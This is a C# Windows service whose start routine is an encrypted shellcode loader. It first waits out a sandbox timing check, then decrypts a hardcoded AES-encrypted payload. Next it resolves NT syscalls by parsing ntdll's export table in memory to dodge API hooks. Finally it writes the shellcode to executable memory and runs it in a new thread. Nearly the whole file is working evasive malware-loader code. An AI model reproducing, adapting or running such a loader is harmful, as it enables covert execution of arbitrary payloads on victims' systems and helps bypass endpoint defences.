using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;

namespace service
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }
	
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds); 
        protected override void OnStart(string[] args)
        {
		
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.5)
            {
                return;
            }
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtAllocateVirtualMemory");
            DELEGATES.NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtAllocateVirtualMemory)) as DELEGATES.NtAllocateVirtualMemory;

                pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtCreateThreadEx");
                DELEGATES.NtCreateThreadEx NtCreateThreadEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtCreateThreadEx)) as DELEGATES.NtCreateThreadEx;

                pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtWaitForSingleObject");
                DELEGATES.NtWaitForSingleObject NtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWaitForSingleObject)) as DELEGATES.NtWaitForSingleObject;

                string MyKey = "74-2D-21-0F-7C-DA-4E-71-2D-AC-D7-80-DA-FD-59-29-DD-56-6C-1B-AE-AB-BD-12-03-9C-9E-88-78-F3-E1-B4";
                string Myiv = "98-FD-D8-5A-7F-53-50-26-24-DA-DC-9F-FC-5E-7B-30";
                byte[] buf = new byte[1536] {0x96, 0x08, 0x2c, 0xe1, 0x29, 0x14, 0xb9, 0xaa, 0xb3, 0x73, 0xe5, 0xca, 0x8c, 0xe5, 0x91, 0xff, 0xa0, 0x8b, 0x6d, 0xbe, 0x87, 0x2e, 0xc5, 0x5b, 0x73, 0x9f, 0x89, 0x24, 0xb9, 0x69, 0x8c, 0x6f, 0x7f, 0x5d, 0x8c, 0x89, 0x1d, 0x3b, 0x2c, 0x68, 0x08, 0x06, 0x37, 0x47, 0xf0, 0x8b, 0x73, 0x34, 0xdd, 0x98, 0x74, 0xf8, 0xc7, 0x19, 0xf6, 0x82, 0x75, 0x00, 0xe7, 0x20, 0xa3, 0xe0, 0xeb, 0xf7, 0x71, 0xda, 0xef, 0x0a, 0xd8, 0xd0, 0x4b, 0x60, 0x78, 0xb5, 0x24, 0x3b, 0x1b, 0x86, 0xbd, 0xa1, 0x7c, 0xa4, 0x43, 0xf6, 0xf4, 0x8b, 0x14, 0x19, 0x9b, 0x9f, 0xa9, 0x5b, 0xbc, 0x90, 0x05, 0xa8, 0x0c, 0xdc, 0x81, 0xac, 0x26, 0x67, 0x05, 0x87, 0x63, 0xe7, 0x01, 0x99, 0xa9, 0x76, 0x3d, 0x15, 0x52, 0xe1, 0x55, 0xbe, 0xee, 0x4c, 0xb2, 0xce, 0x67, 0xa4, 0x06, 0x06, 0x6a, 0x0a, 0x23, 0x28, 0x33, 0xe9, 0x41, 0xa4, 0xf2, 0x56, 0xca, 0x5a, 0xaf, 0x07, 0x53, 0x2b, 0x5e, 0x0f, 0xc8, 0xf2, 0xba, 0xaf, 0xa6, 0xc1, 0x71, 0x05, 0xbc, 0x0e, 0x8f, 0x03, 0x19, 0x6e, 0xe8, 0x3e, 0x2a, 0x3a, 0x0a, 0xca, 0xd3, 0xe8, 0x6a, 0x4c, 0xad, 0xb7, 0x51, 0x62, 0x22, 0x2f, 0x0b, 0x75, 0xb2, 0x1a, 0x3d, 0x90, 0xdc, 0xea, 0x55, 0x7e, 0xe7, 0x98, 0xf0, 0x12, 0x6e, 0xfd, 0x32, 0x56, 0x1a, 0xf0, 0x34, 0x0f, 0x42, 0x22, 0x08, 0xdb, 0xb1, 0x95, 0x55, 0x6e, 0xfd, 0xdd, 0x8d, 0x15, 0x63, 0xd6, 0x0a, 0xb4, 0x4a, 0xd1, 0x56, 0x93, 0x37, 0xbe, 0x27, 0x70, 0x7b, 0xfc, 0xa9, 0x38, 0xe0, 0xa7, 0xf0, 0xe6, 0x02, 0xaf, 0xfb, 0xe2, 0x94, 0x53, 0x80, 0xba, 0xda, 0xaf, 0xf1, 0xff, 0x92, 0xae, 0x3d, 0x8c, 0x32, 0x09, 0x0d, 0xd5, 0xf9, 0x61, 0x83, 0xc7, 0x60, 0x90, 0x81, 0xd2, 0x75, 0x02, 0xff, 0x0d, 0x88, 0x3d, 0xc4, 0xdb, 0x82, 0x5e, 0xec, 0xbb, 0xae, 0x12, 0xd3, 0x38, 0xd1, 0xc3, 0xb3, 0xdc, 0x90, 0x3a, 0xbe, 0x4b, 0x75, 0x62, 0x6f, 0x24, 0x3e, 0x11, 0x15, 0x6f, 0x2b, 0x47, 0x16, 0x69, 0x2b, 0x21, 0x74, 0x70, 0x71, 0xad, 0x58, 0x67, 0x67, 0x22, 0x14, 0x85, 0x00, 0x32, 0x75, 0x9f, 0x74, 0x52, 0x6b, 0xe5, 0xac, 0xe8, 0xcb, 0xf1, 0x6a, 0x94, 0x73, 0x69, 0x70, 0x9c, 0x0b, 0x9e, 0x63, 0xb2, 0xcc, 0xd0, 0x45, 0x58, 0x94, 0x61, 0xe3, 0x8a, 0x11, 0x24, 0xe3, 0xe1, 0x13, 0xbf, 0xdd, 0xca, 0x15, 0x37, 0x5c, 0xf6, 0x14, 0xf9, 0xf7, 0x05, 0x6d, 0xd2, 0x46, 0xdc, 0x33, 0x37, 0xc5, 0xde, 0x8c, 0x0b, 0xab, 0x7d, 0x36, 0x70, 0xf3, 0xa1, 0x78, 0xd1, 0x96, 0x23, 0xe3, 0x4c, 0x17, 0x73, 0x9b, 0xf8, 0x8f, 0xad, 0x5c, 0x86, 0x9e, 0x69, 0xc0, 0xef, 0x0b, 0xf7, 0x26, 0x3f, 0xcc, 0x21, 0x1c, 0x7b, 0x66, 0x93, 0x09, 0x37, 0xa3, 0xa3, 0x56, 0x47, 0xdb, 0x47, 0x81, 0xbc, 0xf7, 0x41, 0x82, 0x3e, 0x53, 0x63, 0xd5, 0x34, 0x1c, 0x31, 0xca, 0xda, 0x42, 0x89, 0x01, 0x54, 0xcb, 0x7b, 0x52, 0x85, 0xc9, 0x3c, 0x46, 0x6e, 0x7e, 0x91, 0x09, 0xf0, 0x59, 0x7c, 0x8e, 0x32, 0xa1, 0x11, 0x0f, 0xb0, 0xb0, 0xa7, 0xc2, 0x4f, 0x26, 0x74, 0xc9, 0xff, 0xe4, 0xca, 0x02, 0xce, 0xf9, 0xef, 0x40, 0x00, 0x90, 0x6e, 0xd6, 0x1e, 0xaa, 0x64, 0xf4, 0x1c, 0xf4, 0x59, 0x7f, 0x3c, 0x81, 0x11, 0xd8, 0x71, 0x16, 0x40, 0xd1, 0xe5, 0x30, 0x55, 0xea, 0x25, 0xe9, 0xab, 0xf7, 0xeb, 0x0e, 0x62, 0x9e, 0x72, 0xf1, 0x2c, 0x3e, 0xbe, 0x60, 0xa1, 0x5a, 0xf6, 0x69, 0xde, 0x3f, 0x8a, 0xdc, 0xd9, 0xaf, 0xfb, 0x8b, 0x48, 0x19, 0x74, 0x89, 0xa0, 0x64, 0xe0, 0x63, 0xc7, 0x95, 0x3e, 0xf7, 0xeb, 0x45, 0x59, 0x5a, 0x58, 0x1e, 0xfe, 0x84, 0x38, 0x3f, 0xb3, 0x68, 0xed, 0xa4, 0xfb, 0xa6, 0x3f, 0xa7, 0xf7, 0x3a, 0xf7, 0xa3, 0xb8, 0x83, 0x8e, 0x59, 0xb6, 0x14, 0x17, 0x8c, 0x37, 0x32, 0x2d, 0x43, 0x41, 0x31, 0xb2, 0x80, 0xea, 0x21, 0xdd, 0x2a, 0x4f, 0x5e, 0x6a, 0x72, 0x7f, 0xe0, 0xe1, 0xc7, 0xe5, 0x67, 0x3a, 0xa6, 0x9c, 0x11, 0xb3, 0xbd, 0x72, 0x6d, 0xa5, 0x79, 0x8e, 0xa7, 0xd7, 0x4a, 0xa7, 0xeb, 0x72, 0xb1, 0x9a, 0x5d, 0x81, 0x46, 0xb4, 0x9f, 0x51, 0xf8, 0x89, 0xd5, 0x71, 0xdb, 0xa0, 0xfb, 0x4a, 0xad, 0xd1, 0xec, 0xe0, 0xdb, 0xda, 0xfa, 0xf0, 0xaa, 0xae, 0x8c, 0x2d, 0x38, 0x95, 0x90, 0xd1, 0x1b, 0x69, 0x85, 0x18, 0x4f, 0xf5, 0x60, 0x4e, 0x5a, 0xc5, 0xa3, 0x8e, 0xc3, 0xdb, 0xd0, 0xdf, 0x57, 0xb2, 0xbc, 0x10, 0x8c, 0x1c, 0x58, 0x79, 0x41, 0x64, 0x83, 0xa7, 0x6a, 0x04, 0xb2, 0x90, 0xe2, 0xcc, 0xb1, 0x55, 0x35, 0xc4, 0x42, 0x72, 0x82, 0xd1, 0xc3, 0x9b, 0x27, 0x18, 0xa9, 0x0b, 0x4f, 0x2f, 0x3a, 0xd6, 0xc4, 0x30, 0xef, 0xce, 0x26, 0xc0, 0xbf, 0x12, 0xd8, 0xc2, 0x60, 0x11, 0x86, 0xbf, 0x9f, 0x2b, 0x72, 0x39, 0x34, 0x87, 0xc7, 0xc0, 0x53, 0x55, 0x77, 0x2b, 0xc3, 0x7b, 0xc6, 0x2b, 0x48, 0xb6, 0x79, 0x1d, 0xcb, 0x77, 0x50, 0xe4, 0xa5, 0x27, 0x7e, 0xc0, 0x63, 0xc2, 0xbb, 0x30, 0x22, 0xfa, 0xe0, 0xc3, 0xcf, 0x6a, 0x51, 0x72, 0xf5, 0x9a, 0xf3, 0x33, 0xce, 0xb6, 0x0d, 0x7d, 0xdb, 0x3c, 0xae, 0x07, 0x51, 0xab, 0xfd, 0xc2, 0x1a, 0x9b, 0xac, 0xca, 0xf9, 0x29, 0xbe, 0x1a, 0x83, 0xb9, 0xa7, 0xfb, 0xa5, 0xa2, 0xcb, 0xd8, 0x12, 0xc9, 0x42, 0xfa, 0xbb, 0x89, 0x7a, 0xe0, 0x96, 0xb1, 0x1f, 0xdb, 0x28, 0xd9, 0x20, 0x53, 0x3a, 0xd1, 0xc0, 0xb9, 0xe2, 0x3f, 0x10, 0x9e, 0x0c, 0xbd, 0x25, 0x7a, 0xce, 0xfa, 0x79, 0xc5, 0x59, 0x5a, 0xae, 0xe8, 0x69, 0x4d, 0x75, 0xc5, 0xf6, 0x6c, 0xb8, 0x71, 0x7a, 0x70, 0xe7, 0xfc, 0x53, 0xc5, 0xfa, 0x7a, 0xcf, 0xab, 0x71, 0xb7, 0x32, 0xb0, 0x97, 0x51, 0x2a, 0xc7, 0x2e, 0x05, 0x8e, 0x11, 0x0c, 0x16, 0x99, 0xf9, 0x15, 0x85, 0xf9, 0xd8, 0xc4, 0xe9, 0x95, 0x37, 0x9a, 0xda, 0x39, 0x64, 0xf7, 0xc5, 0x62, 0x64, 0x6d, 0x88, 0x0e, 0xc5, 0x4f, 0x02, 0x52, 0x80, 0x4a, 0xc5, 0x1a, 0x12, 0x57, 0xce, 0x04, 0xa0, 0x83, 0x00, 0x36, 0xdc, 0xfb, 0x26, 0x47, 0x93, 0x4f, 0x03, 0x71, 0x33, 0x6e, 0xeb, 0xdc, 0xe4, 0x4f, 0xc7, 0x51, 0x07, 0xac, 0x29, 0xef, 0x6b, 0xbf, 0x4e, 0x6a, 0x79, 0x36, 0x8b, 0x62, 0xcc, 0x04, 0x0e, 0xd7, 0xb7, 0x22, 0x02, 0x4d, 0x65, 0x0b, 0xd6, 0x81, 0x18, 0xfb, 0x23, 0x5d, 0x4e, 0x27, 0x97, 0x53, 0x06, 0x4d, 0x4e, 0x9a, 0xbd, 0xaa, 0xf3, 0xd4, 0xf6, 0xea, 0x4e, 0xec, 0x8d, 0x60, 0xb9, 0xfe, 0x3d, 0x9c, 0x9e, 0x7f, 0x54, 0xb5, 0xcb, 0x2c, 0x18, 0x4b, 0x5b, 0xb9, 0xeb, 0x5a, 0x8f, 0x78, 0xed, 0x54, 0xb7, 0xb4, 0x19, 0xb8, 0xab, 0x1b, 0x18, 0x91, 0xff, 0x4c, 0x52, 0xda, 0x17, 0xe2, 0xc9, 0x03, 0x71, 0x9a, 0xb3, 0x69, 0xf0, 0x95, 0xeb, 0x67, 0x75, 0x5a, 0x52, 0xd8, 0x91, 0x32, 0x16, 0xa4, 0x4b, 0xcf, 0x38, 0x0a, 0x29, 0xbe, 0x77, 0x7b, 0xb0, 0x98, 0x18, 0xae, 0x33, 0xc2, 0x70, 0xd4, 0x53, 0x9a, 0x40, 0x0f, 0x93, 0xf5, 0x7d, 0xdc, 0x34, 0x0b, 0x47, 0x76, 0xac, 0xf8, 0xc1, 0x83, 0x5c, 0x2a, 0x01, 0x99, 0x13, 0x2a, 0x9a, 0x03, 0xf7, 0xc3, 0xd4, 0x49, 0x3d, 0xfe, 0x2b, 0xa9, 0x02, 0x17, 0x27, 0xe8, 0x8b, 0xd1, 0x6c, 0x74, 0xf8, 0xfc, 0xf6, 0x97, 0xb8, 0xbf, 0xbd, 0xdb, 0xf2, 0xb6, 0x23, 0xc0, 0x01, 0x4b, 0x8c, 0xf1, 0x50, 0x2a, 0x43, 0x4e, 0x39, 0x35, 0x18, 0x8c, 0x1e, 0xaf, 0x81, 0x4c, 0x6b, 0x32, 0x2f, 0xa8, 0x39, 0xdf, 0x3c, 0xa3, 0x15, 0x33, 0x0a, 0x6e, 0x40, 0xd3, 0x06, 0x2e, 0x0c, 0xc1, 0x40, 0x17, 0x71, 0xd0, 0xcf, 0xc7, 0x72, 0x14, 0x37, 0x4e, 0xcf, 0x5c, 0x4d, 0x45, 0x90, 0xf3, 0xe6, 0x65, 0xa3, 0x7d, 0x64, 0xb6, 0xd2, 0xf5, 0x47, 0xb8, 0x4a, 0xbe, 0xdc, 0xbf, 0xec, 0xa9, 0x85, 0x98, 0x7c, 0xfb, 0x0a, 0x5a, 0xca, 0x38, 0xc0, 0xd7, 0xea, 0x13, 0x72, 0xfb, 0xaf, 0x8d, 0xa7, 0x2b, 0x3c, 0x07, 0xdc, 0x35, 0x9b, 0x41, 0x38, 0x80, 0xdd, 0x65, 0x3a, 0x35, 0x93, 0x63, 0xd8, 0x1d, 0xd4, 0xc2, 0xe4, 0x22, 0xe2, 0xa8, 0xc5, 0x9d, 0x3b, 0x71, 0x5a, 0x99, 0xb6, 0x9b, 0xd0, 0xc6, 0x0b, 0xe0, 0x64, 0x18, 0x6c, 0x1b, 0x60, 0xde, 0x63, 0xd3, 0x48, 0xe1, 0x89, 0x17, 0x04, 0x58, 0x0d, 0x7b, 0xda, 0xb3, 0xf3, 0xf6, 0xb5, 0xc8, 0xf1, 0x48, 0x27, 0x34, 0xc5, 0xdf, 0x50, 0xd0, 0x26, 0x65, 0xc6, 0x2b, 0x7c, 0xc9, 0xb0, 0x1e, 0x66, 0xde, 0x1a, 0xef, 0x2a, 0x9b, 0xc7, 0x10, 0x93, 0xc9, 0x47, 0x71, 0x34, 0x32, 0x78, 0x53, 0x2b, 0x51, 0x67, 0x28, 0xe7, 0xfa, 0x87, 0x06, 0xe8, 0xe2, 0x78, 0x40, 0x93, 0x31, 0x05, 0x12, 0xfe, 0xbe, 0x54, 0x5e, 0xb0, 0x3e, 0x51, 0x2f, 0x0e, 0x3a, 0x3d, 0xae, 0xa6, 0xd7, 0xba, 0xe6, 0x6b, 0x41, 0xc6, 0xde, 0x80, 0x48, 0x52, 0x5b, 0xfe, 0xbe, 0x4a, 0xb4, 0x33, 0x53, 0x02, 0x13, 0x20, 0x41, 0x5d, 0x64, 0x16, 0xdc, 0xb1, 0x61, 0x38, 0xa4, 0x2b, 0x46, 0x9f, 0x64, 0xa4, 0x35, 0x92, 0x65, 0x35, 0xdd, 0x83, 0x69, 0x06, 0x4a, 0x2d, 0xdc, 0x41, 0x6c, 0x55, 0xca, 0xb1, 0x0f, 0x3b, 0x8f, 0x65, 0xc7, 0x7b, 0x40, 0x13, 0x58, 0xca, 0x00, 0x5c, 0xa9, 0x15, 0x09, 0x26, 0x0c, 0x50, 0x48, 0x55, 0xa3, 0x3f, 0x77, 0xb4, 0x1f, 0x2c, 0x18, 0x4e, 0x46, 0xbd, 0xec, 0x91, 0x94, 0x74, 0x12, 0xe4, 0xfa, 0x7b, 0x00, 0xdf, 0xe4, 0x0c, 0xd8, 0x6b, 0xcd, 0x78, 0xa3, 0x4c, 0x3a, 0x09, 0x5c, 0xe7, 0x34, 0xd2, 0x3b, 0x8d, 0x57, 0x8b, 0x56, 0x2c, 0x6a, 0x1b, 0xdc, 0xd2, 0xac, 0xc3, 0x2c, 0x4d, 0x7d, 0x97, 0x5e, 0x33, 0xff, 0x67, 0x60, 0x88, 0xb0, 0xd1, 0xb3, 0xd8, 0x56, 0xcf, 0xed, 0xcb, 0x0c, 0x88, 0xc0, 0xe3, 0x97, 0x8f, 0xbb, 0xd6, 0xdd, 0xee, 0xbf, 0x58, 0xdc, 0x98, 0x8f, 0x89, 0xfd, 0x52, 0xe3, 0xfd, 0x02, 0x5f, 0xba, 0x7e, 0x32, 0xad, 0xba, 0xbd, 0x8d, 0x83, 0xda, 0x63, 0xe1, 0x7d, 0xde, 0x19, 0x9d, 0x79, 0x88, 0xfc, 0x52, 0xc7, 0x44, 0x37, 0x70, 0x98, 0xcd, 0x17, 0x7b, 0x92, 0xbf, 0xdf, 0x49, 0x72, 0x1f, 0x5a, 0x66, 0x8a, 0x2d, 0xc0, 0x99, 0x75, 0x4f, 0x9a, 0x4e, 0x68, 0x04, 0x68, 0x87, 0x0f, 0x22, 0xd3, 0xb6, 0x76, 0xd1, 0xac, 0x3d, 0x1a, 0xf2, 0x97, 0x06, 0x1a, 0xcc, 0xa8, 0xb8, 0xc9, 0xcc, 0x2f, 0x64, 0xfd, 0x8c, 0x60, 0x76, 0xf2, 0x93, 0xc2, 0x61, 0x3c, 0x53, 0x0c, 0xe4, 0x97, 0x85, 0x73, 0x3f, 0xfe, 0x77, 0x99, 0x68, 0x20, 0xbc, 0x00, 0x84, 0x8c, 0x8e, 0xd8, 0x9c, 0xe2, 0xee, 0x39, 0x44, 0x7b, 0x98, 0x00, 0xf1, 0x3c, 0xc8, 0x40, 0x96, 0xfc, 0xd7, 0x82, 0x4b, 0x94, 0x5b, 0x75, 0xc3, 0x65, 0xcb, 0xff, 0xc9, 0x50, 0x40, 0xc2, 0x5b, 0x70, 0xec, 0xb3, 0xcf, 0xbb, 0xe3, 0xed, 0x84, 0xbe, 0xe5, 0xf9, 0x90, 0x2e, 0x12, 0xa8};
                //Convert key to bytes
                string[] c1 = MyKey.Split('-');
                byte[] f = new byte[c1.Length];
                for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
                //Convert IV to bytes
                string[] d1 = Myiv.Split('-');
                byte[] g = new byte[d1.Length];
                for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);
                string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
                // Remove dashes from string
                string[] roundnodash = roundtrip.Split('-');
                // Convert Decrypted shellcode back to bytes
                byte[] e = new byte[roundnodash.Length];
                for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

                IntPtr hCurrentProcess = GetCurrentProcess();
                IntPtr pMemoryAllocation = new IntPtr(); // needs to be passed as ref
                IntPtr pZeroBits = IntPtr.Zero;
                IntPtr pAllocationSize = new IntPtr(Convert.ToUInt32(e.Length)); // needs to be passed as ref
                uint allocationType = 0x3000;
                uint protection = 0x00000040;
                NtAllocateVirtualMemory(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
                Marshal.Copy(e, 0, pMemoryAllocation, e.Length);

                IntPtr hThread = new IntPtr(0);
                STRUCTS.ACCESS_MASK desiredAccess = STRUCTS.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | STRUCTS.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
                IntPtr pObjectAttributes = new IntPtr(0);
                IntPtr lpParameter = new IntPtr(0);
                bool bCreateSuspended = false;
                int stackZeroBits = 0;
                int sizeOfStackCommit = 0xFFFF;
                int sizeOfStackReserve = 0xFFFF;
                IntPtr pBytesBuffer = new IntPtr(0);

                NtCreateThreadEx(out hThread, desiredAccess, pObjectAttributes, hCurrentProcess, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
                NtWaitForSingleObject(hThread, false, 0); 
        }
	
        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                    throw new ArgumentNullException("Key");
                if (IV == null || IV.Length <= 0)
                    throw new ArgumentNullException("IV");
                string plaintext = null;
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = Key;
                    aesAlg.IV = IV;
                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                    using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {
                                plaintext = srDecrypt.ReadToEnd();
                            }
                        }
                    }
                }
                return plaintext;
        }
            
        protected override void OnStop()
        {
        }
    }
    
    public class DELEGATES
    {
        //standalone delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtCreateThreadEx(out IntPtr threadHandle, STRUCTS.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtWaitForSingleObject(IntPtr ProcessHandle, Boolean Alertable, int TimeOut);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);
    }
    public class STRUCTS
    {
        public enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFF,
            ACCESS_SYSTEM_SECURITY = 0x01000000,
            MAXIMUM_ALLOWED = 0x02000000,
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,
            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,
            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,
            WINSTA_ALL_ACCESS = 0x0000037F,
            SECTION_ALL_ACCESS = 0x10000000,
            SECTION_QUERY = 0x0001,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_EXECUTE = 0x0008,
            SECTION_EXTEND_SIZE = 0x0010
        };
    }
    public class Invoke
    {
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName, ResolveForwards);
        }
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = false)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Get the VAs of the name table's beginning and end.
                Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
                Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }
            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
    }
}
